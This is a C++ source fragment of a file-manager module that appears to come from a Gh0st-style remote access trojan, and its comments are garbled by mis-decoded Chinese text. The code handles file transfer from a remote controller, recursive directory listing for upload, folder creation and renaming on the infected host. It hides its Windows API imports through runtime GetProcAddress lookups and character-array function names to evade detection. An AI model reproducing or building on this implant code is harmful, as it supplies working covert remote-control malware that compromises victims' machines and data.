	m_nCurrentProcessFileLength = (pFileSize->dwSizeHigh * (MAXDWORD + 1)) + pFileSize->dwSizeLow;
	
	// �������Ŀ¼
	MakeSureDirectoryPathExists(m_strCurrentProcessFileName);
	

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = pFindFirstFileA(m_strCurrentProcessFileName, &FindFileData);
	
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE);
	}
	else
	{
		GetFileData();
	}
	pFindClose(hFind);
}
bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
{
	typedef BOOL
		(WINAPI
		*FindCloseT)(
		__inout HANDLE hFindFile
		);
	FindCloseT pFindClose=(FindCloseT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindClose");

	typedef HANDLE
		(WINAPI
		*FindFirstFileAT)(
		__in  LPCSTR lpFileName,
		__out LPWIN32_FIND_DATAA lpFindFileData
		);
	FindFirstFileAT pFindFirstFileA=(FindFirstFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindFirstFileA");

	typedef BOOL
		(WINAPI
		*FindNextFileAT)(
		__in  HANDLE hFindFile,
		__out LPWIN32_FIND_DATAA lpFindFileData
		);
	FindNextFileAT pFindNextFileA=(FindNextFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindNextFileA");

	typedef int
		(WINAPI
		*lstrlenAT)(
		__in LPCSTR lpString
		);	
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");

	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));
	
	if (lpPathName[plstrlenA(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
	
	wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);
	

	
	HANDLE hFind = pFindFirstFileA(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
		return false;
	
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);
			}
		}
	} while (pFindNextFileA(hFind, &wfd));
	
	pFindClose(hFind); // �رղ��Ҿ��
	return true;
}


void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	typedef BOOL (WINAPI *CloseHandleT)
		(
		__in HANDLE hObject
		);
	char DDZGlGm[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle = (CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DDZGlGm);

	typedef HANDLE (WINAPI *CreateFileAT)
		(
		__in     LPCSTR lpFileName,
		__in     DWORD dwDesiredAccess,
		__in     DWORD dwShareMode,
		__in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
		__in     DWORD dwCreationDisposition,
		__in     DWORD dwFlagsAndAttributes,
		__in_opt HANDLE hTemplateFile
		);
	CreateFileAT pCreateFileA= (CreateFileAT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateFileA");

	typedef  DWORD (WINAPI *SetFilePointerT)
		(
		__in HANDLE hFile, __in LONG lDistanceToMove, __in_opt PLONG lpDistanceToMoveHigh, __in DWORD dwMoveMethod
		);
	SetFilePointerT pSetFilePointer = (SetFilePointerT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"SetFilePointer");

	typedef BOOL (WINAPI *WriteFileT)
		(
		__in        HANDLE hFile,
		__in_bcount(nNumberOfBytesToWrite) LPCVOID lpBuffer,
		__in        DWORD nNumberOfBytesToWrite,
		__out_opt   LPDWORD lpNumberOfBytesWritten,
		__inout_opt LPOVERLAPPED lpOverlapped
		);
	WriteFileT pWriteFile = (WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"WriteFile");

	// �������
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9
	FILESIZE	*pFileSize;
	// �õ����ݵ�ƫ��
	pData = lpBuffer + 8;
	
	pFileSize = (FILESIZE *)lpBuffer;

	// �õ��������ļ��е�ƫ��

	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	
	dwBytesToWrite = nSize - 8;
	
	HANDLE	hFile = 
		pCreateFileA
		(
		m_strCurrentProcessFileName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	
	pSetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int nRet = 0;
		// д���ļ�
	nRet = pWriteFile
		(
		hFile,
		pData, 
		dwBytesToWrite, 
		&dwBytesWrite,
		NULL
		);
// 	if (nRet <= 0)
// 		printf("�ļ�д��ʧ��");
	pCloseHandle(hFile);
	// Ϊ�˱Ƚϣ�����������

	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	dwOffsetLow += dwBytesWrite;
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));
}
void CFileManager::GetFileData()
{
	typedef BOOL (WINAPI *CloseHandleT)
		(
		__in HANDLE hObject
		);
	char DDZGlGm[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle = (CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DDZGlGm);

	typedef HANDLE (WINAPI *CreateFileAT)
		(
		__in     LPCSTR lpFileName,
		__in     DWORD dwDesiredAccess,
		__in     DWORD dwShareMode,
		__in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
		__in     DWORD dwCreationDisposition,
		__in     DWORD dwFlagsAndAttributes,
		__in_opt HANDLE hTemplateFile
		);
	CreateFileAT pCreateFileA= (CreateFileAT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateFileA");

	typedef BOOL
		(WINAPI
		*FindCloseT)(
		__inout HANDLE hFindFile
		);
	FindCloseT pFindClose=(FindCloseT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindClose");

	typedef HANDLE
		(WINAPI
		*FindFirstFileAT)(
		__in  LPCSTR lpFileName,
		__out LPWIN32_FIND_DATAA lpFindFileData
		);
	FindFirstFileAT pFindFirstFileA=(FindFirstFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindFirstFileA");

	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = pFindFirstFileA(m_strCurrentProcessFileName, &FindFileData);
	
	//  1�ֽ�Token,���ֽ�ƫ�Ƹ���λ�����ֽ�ƫ�Ƶ���λ
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // �ļ��򿪷�ʽ 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	
	// �ļ��Ѿ�����
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// ��ʾ��ʲô
		// ���������
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
		// ����
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// ƫ����0
			memset(bToken + 1, 0, 8);
			// ���´���
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// ������һ��
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// ƫ����0
		memset(bToken + 1, 0, 8);
		// ���´���
		dwCreationDisposition = CREATE_ALWAYS;
	}
	pFindClose(hFind);

	HANDLE	hFile = 
		pCreateFileA
		(
		m_strCurrentProcessFileName, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// ��Ҫ������
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	pCloseHandle(hFile);

	Send(bToken, sizeof(bToken));
}
void CFileManager::SetTransferMode(LPBYTE lpBuffer)
{
	memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	GetFileData();
}

void CFileManager::CreateFolder(LPBYTE lpBuffer)
{
	MakeSureDirectoryPathExists((char *)lpBuffer);
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}

void CFileManager::Rename(LPBYTE lpBuffer)
{
	typedef int
		(WINAPI
		*lstrlenAT)(
		__in LPCSTR lpString
		);	
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");

	LPCTSTR lpExistingFileName = (char *)lpBuffer;
	LPCTSTR lpNewFileName = lpExistingFileName + plstrlenA(lpExistingFileName) + 1;
	::MoveFile(lpExistingFileName, lpNewFileName);
	SendToken(TOKEN_RENAME_FINISH);
}